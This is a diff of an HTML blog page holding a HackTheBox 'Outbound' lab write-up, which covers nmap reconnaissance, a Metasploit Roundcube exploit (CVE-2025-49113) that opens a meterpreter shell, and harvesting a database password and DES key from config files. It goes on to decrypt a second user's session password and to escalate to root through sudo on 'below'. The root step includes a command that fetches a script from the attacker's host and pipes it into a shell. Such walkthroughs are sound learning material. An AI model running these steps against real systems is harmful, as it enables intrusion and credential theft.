@@ -1,137 +1,215 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  
-    <title>Outbound [Write-up] - HackTheBox :: Maaroof Khan - Blog</title>
-  
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="A detailed walkthrough of the HackTheBox &#39;Outbound&#39; machine." />
-<meta name="keywords" content="Outbound, HTB, Roundcube, CVE-2023-43770, Below, Privilege Escalation" />
+<html lang="en" dir="auto" data-theme="auto">
 
-  <meta name="robots" content="noodp" />
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Outbound [Write-up] - HackTheBox | Maaroof Khan (Blog)</title>
+<meta name="keywords" content="">
+<meta name="description" content="Hello everyone, and welcome to my first-ever write-up!
+This box seemed pretty straightforward at first, but it wasn&rsquo;t long before it had me begging for mercy. Let&rsquo;s dive in!
 
-<link rel="canonical" href="https://Maaroof-Khan10.github.io/posts/2/" />
+I booted up the &ldquo;Outbound&rdquo; machine, ready to see what this bad boy had to offer. We&rsquo;re handed credentials right from the start (tyler / LhKL1o9Nm3X2), which almost certainly means a login portal awaits.
+Initial Reconnaissance
+As is tradition with any HackTheBox machine, the first step is always nmap.">
+<meta name="author" content="Maaroof Khan">
+<link rel="canonical" href="https://Maaroof-Khan10.github.io/posts/2/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.89ca4972ab5e6aaa05e9a0dae0c4bb64b26585bc79e36f5cf33614eea0283abe.css" integrity="sha256-icpJcqteaqoF6aDa4MS7ZLJlhbx5429c8zYU7qAoOr4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://Maaroof-Khan10.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Maaroof-Khan10.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Maaroof-Khan10.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://Maaroof-Khan10.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://Maaroof-Khan10.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://Maaroof-Khan10.github.io/posts/2/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://Maaroof-Khan10.github.io/posts/2/">
+  <meta property="og:site_name" content="Maaroof Khan (Blog)">
+  <meta property="og:title" content="Outbound [Write-up] - HackTheBox">
+  <meta property="og:description" content="Hello everyone, and welcome to my first-ever write-up!
+This box seemed pretty straightforward at first, but it wasn’t long before it had me begging for mercy. Let’s dive in!
+I booted up the “Outbound” machine, ready to see what this bad boy had to offer. We’re handed credentials right from the start (tyler / LhKL1o9Nm3X2), which almost certainly means a login portal awaits.
+Initial Reconnaissance As is tradition with any HackTheBox machine, the first step is always nmap.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-10T16:46:16+05:30">
+    <meta property="article:modified_time" content="2025-08-10T16:46:16+05:30">
+    <meta property="og:image" content="https://Maaroof-Khan10.github.io/cover.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://Maaroof-Khan10.github.io/cover.png">
+  <meta name="twitter:title" content="Outbound [Write-up] - HackTheBox">
+  <meta name="twitter:description" content="Hello everyone, and welcome to my first-ever write-up!
+This box seemed pretty straightforward at first, but it wasn’t long before it had me begging for mercy. Let’s dive in!
+I booted up the “Outbound” machine, ready to see what this bad boy had to offer. We’re handed credentials right from the start (tyler / LhKL1o9Nm3X2), which almost certainly means a login portal awaits.
+Initial Reconnaissance As is tradition with any HackTheBox machine, the first step is always nmap.">
 
 
-
-
-
-
-
-  
-  
-  
-  
-  
-  <link rel="stylesheet" href="https://Maaroof-Khan10.github.io/styles.css">
-
-
-
-
-
-
-<meta name="twitter:card" content="summary" />
-
-
-
-<meta property="og:locale" content="en" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Outbound [Write-up] - HackTheBox">
-<meta property="og:description" content="A detailed walkthrough of the HackTheBox &#39;Outbound&#39; machine." />
-<meta property="og:url" content="https://Maaroof-Khan10.github.io/posts/2/" />
-<meta property="og:site_name" content="Maaroof Khan - Blog" />
-
-  
-  
-  <meta property="og:image" content="https://Maaroof-Khan10.github.io/">
-
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="627">
-
-
-  <meta property="article:published_time" content="2025-08-10 16:46:16 &#43;0530 IST" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Maaroof-Khan10.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Outbound [Write-up] - HackTheBox",
+      "item": "https://Maaroof-Khan10.github.io/posts/2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Outbound [Write-up] - HackTheBox",
+  "name": "Outbound [Write-up] - HackTheBox",
+  "description": "Hello everyone, and welcome to my first-ever write-up!\nThis box seemed pretty straightforward at first, but it wasn\u0026rsquo;t long before it had me begging for mercy. Let\u0026rsquo;s dive in!\nI booted up the \u0026ldquo;Outbound\u0026rdquo; machine, ready to see what this bad boy had to offer. We\u0026rsquo;re handed credentials right from the start (tyler / LhKL1o9Nm3X2), which almost certainly means a login portal awaits.\nInitial Reconnaissance As is tradition with any HackTheBox machine, the first step is always nmap.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Hello everyone, and welcome to my first-ever write-up!\nThis box seemed pretty straightforward at first, but it wasn’t long before it had me begging for mercy. Let’s dive in!\nI booted up the “Outbound” machine, ready to see what this bad boy had to offer. We’re handed credentials right from the start (tyler / LhKL1o9Nm3X2), which almost certainly means a login portal awaits.\nInitial Reconnaissance As is tradition with any HackTheBox machine, the first step is always nmap.\nnmap -T5 10.10.11.77 I ran a T5 scan for some quick results.\nAnd here’s what we got:\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 16:54 IST Nmap scan report for 10.10.11.77 Host is up (0.16s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 4.31 seconds We have a web server on port 80 and SSH on port 22. Seeing SSH usually means we’ll be using it later. Now, let’s get this box to spill some beans with a more aggressive scan.\nnmap -Pn -p 22,80 -sC -sV 10.10.11.77 The output was revealing:\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 17:00 IST Nmap scan report for 10.10.11.77 Host is up (0.16s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA) |_ 256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-title: Did not follow redirect to http://mail.outbound.htb/ |_http-server-header: nginx/1.24.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The web server redirects to http://mail.outbound.htb, so let’s add that to our /etc/hosts file.\nsudo nano /etc/hosts I added the following line: 10.10.11.77 outbound.htb mail.outbound.htb\nTime to check out this mailing service.\nRoundcube Exploit Here it is, the moment we’ve all been waiting for: a login page! Let’s use the credentials we were given. Success! We’re in, but Tyler’s inbox is bone dry. Guess he isn’t too popular.\nA quick look at the “About” section reveals the software version.\nWe’re dealing with Roundcube Webmail 1.6.10. Before diving down a Google rabbit hole for exploits, my first move is always to fire up metasploit.\nsudo msfconsole search roundcube And what do you know, we hit the jackpot! An exploit for our version is available. The exact CVE is CVE‑2025‑49113.\nTime to exploit (rubs hands). Used the following steps to run the exploit:\nuse 1 set RHOSTS mail.outbound.htb set LHOST tun0 set USERNAME tyler set PASSWORD LhKL1o9Nm3X2 run And just like that, we have a meterpreter shell!\nFinding Juicy Details (Post-Exploitation) My first order of business on a new machine is always to hunt for passwords and config files.\nfind /var -name \"config\" 2\u003e/dev/null This led me to /var/www/html/roundcube/config.\nPeeking into this folder gave away the file config.inc.php and it contained some spicy details. Here is a sneak peak:\n$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube'; $config['des_key'] = 'rcmail-!24ByteDESkey*Str'; We’ve got the MySQL password and a DES key. This will definitely come in handy. Let’s check into mysql and see what we get.\nmysql -u roundcube -pRCDBPass2025 roundcube Once we are in we can make basic queries (The responses take their sweet time to show up so be patient here)\nuse roundcube; show tables; select * from users; select * from session; This part in my opinion was the trickiest of all in this box The session table gives us a bunch of base64 encoded session details\nUsing CyberChef, we can decode this data and find something very interesting.\nWe found another user, jacob, and more importantly, his password! The catch? It’s encrypted. But wait, we have that DES key from the config file. After a lot of digging, I confirmed that Roundcube uses Triple DES for session data encryption.\nHere’s how to decrypt the password:\nConvert the password from base64 to hex Copy the first 8 bytes (They will be your IV - Initialization Vector for decryption) Enter the first 8 bytes into the IV field (keep it hex) in cyberchef Triple DES Decrypt, along with the des key (set it to utf-8 first) Paste the rest of the hex into the input part (Except the first 8 bytes we used) Get the password Here is the decrypted password we get:\nPrivilege Escalation Now that we have jacob in our control, let’s check this lad’s account shall we\nsu jacob # Enter the password cat /home/jacob/user.txt We’ve got the user flag!\nNow that we are Jacob let’s check the home folder\ncd /home/jacob It had a mail folder which had a INBOX folder which contained a file jacob\ncat jacob Gave us 2 mails, One contained the ssh credentials for jacob The other said:\n“We have been experiencing high resource consumption on our main server. For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs. Please inform us immediately if you notice any irregularities.”\nThis is a massive clue. It sounds like Jacob has special permissions to run a service as root. Time for a proper shell!\nssh jacob@10.10.11.77 Now that we have user.txt and a massive clue from that mail lets check how we can escalate. Lets use LinPeas to find something (sudo -l could also reveal information but linpeas might give additional details)\n# On your machine - where linpeas.sh resides sudo python3 -m http.server 80 # On victim's ssh shell curl -L /linpeas.sh | sh As predicted we got this:\nUser jacob may run the following commands on outbound: (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d* We can run the below command as root without a password. A goldmine, if I ever saw one. This part took me the most time, as I was trying to exploit it manually without success.\nA quick search online for a below exploit leads to CVE-2025-27591.\nI found a really cool python exploitation script (Check it out)\nI transferred the script to the victim machine and ran it.\n# On your machine python3 -m http.server 80 # On the victim's machine wget http:///exploit.py python3 exploit.py And Wham-Bam-Thank-You-Ma’am! We got root!\nNow, just head to /root and grab your well-earned flag.\nHappy Hacking! And see you next time.\n",
+  "wordCount" : "1032",
+  "inLanguage": "en",
+  "image":"https://Maaroof-Khan10.github.io/cover.png","datePublished": "2025-08-10T16:46:16+05:30",
+  "dateModified": "2025-08-10T16:46:16+05:30",
+  "author":{
+    "@type": "Person",
+    "name": "Maaroof Khan"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Maaroof-Khan10.github.io/posts/2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Maaroof Khan (Blog)",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Maaroof-Khan10.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
-<body class="red">
-
-
-
-
-<div class="container center headings--one-size">
-
-  <header class="header">
-  <div class="header__inner">
-    <div class="header__logo">
-      <a href="https://Maaroof-Khan10.github.io/">
-  <div class="logo">
-    MK:WriteUp Spot
-  </div>
-</a>
-
-    </div>
-    
-    
-  </div>
-  
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://Maaroof-Khan10.github.io/" accesskey="h" title="Maaroof Khan (Blog) (Alt + H)">Maaroof Khan (Blog)</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+        </ul>
+    </nav>
 </header>
+<main class="main">
 
-
-  <div class="content">
+<article class="post-single">
+  <header class="post-header">
     
-<article class="post">
-  <h1 class="post-title">
-    <a href="https://Maaroof-Khan10.github.io/posts/2/">Outbound [Write-up] - HackTheBox</a>
-  </h1>
-  <div class="post-meta"><time class="post-date">2025-08-10</time><span class="post-author">Maaroof Khan</span>
-    
-<span class="post-reading-time">5 min read (1032 words)</span></div>
+    <h1 class="post-title entry-hint-parent">
+      Outbound [Write-up] - HackTheBox
+    </h1>
+    <div class="post-meta">
 
-  
-    <span class="post-tags">
-      
-      #<a href="https://Maaroof-Khan10.github.io/tags/hackthebox/">HackTheBox</a>&nbsp;
-      
-      #<a href="https://Maaroof-Khan10.github.io/tags/writeup/">Writeup</a>&nbsp;
-      
-      #<a href="https://Maaroof-Khan10.github.io/tags/linux/">Linux</a>&nbsp;
-      
-      #<a href="https://Maaroof-Khan10.github.io/tags/easy/">Easy</a>&nbsp;
-      
-    </span>
-  
-  
+<span title='2025-08-10 16:46:16 +0530 IST'>August 10, 2025</span>&nbsp;·&nbsp;<span>Maaroof Khan</span>
 
-
-
-  
-
-  <div class="post-content"><div>
-        <p>Hello everyone, and welcome to my first-ever write-up!</p>
+</div>
+  </header> 
+<figure class="entry-cover">
+            <img loading="eager"
+                srcset='https://Maaroof-Khan10.github.io/posts/2/cover_hu_8fb2139f62c58a8e.png 360w,https://Maaroof-Khan10.github.io/posts/2/cover_hu_be14c396eb61f540.png 480w,https://Maaroof-Khan10.github.io/posts/2/cover_hu_63dc67ef229fb4cd.png 720w,https://Maaroof-Khan10.github.io/posts/2/cover.png 860w'
+                src="https://Maaroof-Khan10.github.io/posts/2/cover.png"
+                sizes="(min-width: 768px) 720px, 100vw"
+                width="860" height="407"
+                alt="Outbound has been Pwned!">
+        <figcaption>Outbound has been Pwned!</figcaption>
+</figure>
+  <div class="post-content md-content"><p>Hello everyone, and welcome to my first-ever write-up!</p>
 <p>This box seemed pretty straightforward at first, but it wasn&rsquo;t long before it had me begging for mercy. Let&rsquo;s dive in!</p>
-<p><img src="htb_task_page.png" alt="HackTheBox Task Page"></p>
+<p><img alt="HackTheBox Task Page" loading="lazy" src="/posts/2/htb_task_page.png"></p>
 <p>I booted up the &ldquo;Outbound&rdquo; machine, ready to see what this bad boy had to offer. We&rsquo;re handed credentials right from the start (<code>tyler / LhKL1o9Nm3X2</code>), which almost certainly means a login portal awaits.</p>
-<h3 id="initial-reconnaissance">Initial Reconnaissance<a href="#initial-reconnaissance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="initial-reconnaissance">Initial Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#initial-reconnaissance">#</a></h3>
 <p>As is tradition with any HackTheBox machine, the first step is always <code>nmap</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -T5 10.10.11.77
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -T5 10.10.11.77
 </span></span></code></pre></div><p>I ran a <code>T5</code> scan for some quick results.</p>
 <p>And here’s what we got:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-08-10 16:54 IST
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-08-10 16:54 IST
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.77
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
 </span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
@@ -141,9 +219,9 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.31 seconds
 </span></span></code></pre></div><p>We have a web server on port 80 and SSH on port 22. Seeing SSH usually means we&rsquo;ll be using it later. Now, let&rsquo;s get this box to spill some beans with a more aggressive scan.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn -p 22,80 -sC -sV 10.10.11.77
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn -p 22,80 -sC -sV 10.10.11.77
 </span></span></code></pre></div><p>The output was revealing:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-08-10 17:00 IST
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-08-10 17:00 IST
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.77
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
 </span></span><span style="display:flex;"><span>
@@ -157,48 +235,48 @@
 </span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span></code></pre></div><p>The web server redirects to <code>http://mail.outbound.htb</code>, so let&rsquo;s add that to our <code>/etc/hosts</code> file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nano /etc/hosts
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nano /etc/hosts
 </span></span></code></pre></div><p>I added the following line:
 <code>10.10.11.77     outbound.htb mail.outbound.htb</code></p>
 <p>Time to check out this mailing service.</p>
-<p><img src="roundcube_login.png" alt="Roundcube Login Page"></p>
-<h3 id="roundcube-exploit">Roundcube Exploit<a href="#roundcube-exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><img alt="Roundcube Login Page" loading="lazy" src="/posts/2/roundcube_login.png"></p>
+<h3 id="roundcube-exploit">Roundcube Exploit<a hidden class="anchor" aria-hidden="true" href="#roundcube-exploit">#</a></h3>
 <p>Here it is, the moment we&rsquo;ve all been waiting for: a login page! Let&rsquo;s use the credentials we were given. Success! We&rsquo;re in, but Tyler&rsquo;s inbox is bone dry. Guess he isn&rsquo;t too popular.</p>
 <p>A quick look at the &ldquo;About&rdquo; section reveals the software version.</p>
-<p><img src="roundcube_about.png" alt="Roundcube About Page"></p>
+<p><img alt="Roundcube About Page" loading="lazy" src="/posts/2/roundcube_about.png"></p>
 <p>We&rsquo;re dealing with <strong>Roundcube Webmail 1.6.10</strong>. Before diving down a Google rabbit hole for exploits, my first move is always to fire up <code>metasploit</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfconsole
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfconsole
 </span></span><span style="display:flex;"><span>search roundcube
 </span></span></code></pre></div><p>And what do you know, we hit the jackpot! An exploit for our version is available. The exact CVE is <code>CVE‑2025‑49113</code>.</p>
-<p><img src="metasploit_exp.png" alt="Metasploit Modules"></p>
+<p><img alt="Metasploit Modules" loading="lazy" src="/posts/2/metasploit_exp.png"></p>
 <p>Time to exploit (rubs hands).
 Used the following steps to run the exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use <span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use <span style="color:#ae81ff">1</span>
 </span></span><span style="display:flex;"><span>set RHOSTS mail.outbound.htb
 </span></span><span style="display:flex;"><span>set LHOST tun0
 </span></span><span style="display:flex;"><span>set USERNAME tyler
 </span></span><span style="display:flex;"><span>set PASSWORD LhKL1o9Nm3X2
 </span></span><span style="display:flex;"><span>run
 </span></span></code></pre></div><p>And just like that, we have a meterpreter shell!</p>
-<h3 id="finding-juicy-details-post-exploitation">Finding Juicy Details (Post-Exploitation)<a href="#finding-juicy-details-post-exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="finding-juicy-details-post-exploitation">Finding Juicy Details (Post-Exploitation)<a hidden class="anchor" aria-hidden="true" href="#finding-juicy-details-post-exploitation">#</a></h3>
 <p>My first order of business on a new machine is always to hunt for passwords and config files.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find /var -name <span style="color:#e6db74">&#34;config&#34;</span> 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find /var -name <span style="color:#e6db74">&#34;config&#34;</span> 2&gt;/dev/null
 </span></span></code></pre></div><p>This led me to <code>/var/www/html/roundcube/config</code>.</p>
 <p>Peeking into this folder gave away the file <code>config.inc.php</code> and it contained some spicy details.
 Here is a sneak peak:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$config[<span style="color:#e6db74">&#39;db_dsnw&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysql://roundcube:RCDBPass2025@localhost/roundcube&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$config[<span style="color:#e6db74">&#39;db_dsnw&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysql://roundcube:RCDBPass2025@localhost/roundcube&#39;</span>;
 </span></span><span style="display:flex;"><span>$config[<span style="color:#e6db74">&#39;des_key&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rcmail-!24ByteDESkey*Str&#39;</span>;
 </span></span></code></pre></div><p>We&rsquo;ve got the MySQL password and a DES key. This will definitely come in handy. Let&rsquo;s check into mysql and see what we get.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u roundcube -pRCDBPass2025 roundcube
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u roundcube -pRCDBPass2025 roundcube
 </span></span></code></pre></div><p>Once we are in we can make basic queries (The responses take their sweet time to show up so be patient here)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>use roundcube;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>use roundcube;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">show</span> tables;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">session</span>;
-</span></span></code></pre></div><h4 id="this-part-in-my-opinion-was-the-trickiest-of-all-in-this-box">This part in my opinion was the trickiest of all in this box<a href="#this-part-in-my-opinion-was-the-trickiest-of-all-in-this-box" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+</span></span></code></pre></div><h4 id="this-part-in-my-opinion-was-the-trickiest-of-all-in-this-box">This part in my opinion was the trickiest of all in this box<a hidden class="anchor" aria-hidden="true" href="#this-part-in-my-opinion-was-the-trickiest-of-all-in-this-box">#</a></h4>
 <p>The <code>session</code> table gives us a bunch of base64 encoded session details</p>
 <p>Using CyberChef, we can decode this data and find something very interesting.</p>
-<p><img src="cyberchef-jacob.png" alt="CyberChef showing Jacob&rsquo;s credentials"></p>
+<p><img alt="CyberChef showing Jacob&rsquo;s credentials" loading="lazy" src="/posts/2/cyberchef-jacob.png"></p>
 <p>We found another user, <code>jacob</code>, and more importantly, his password! The catch? It&rsquo;s encrypted. But wait, we have that DES key from the config file. After a lot of digging, I confirmed that Roundcube uses Triple DES for session data encryption.</p>
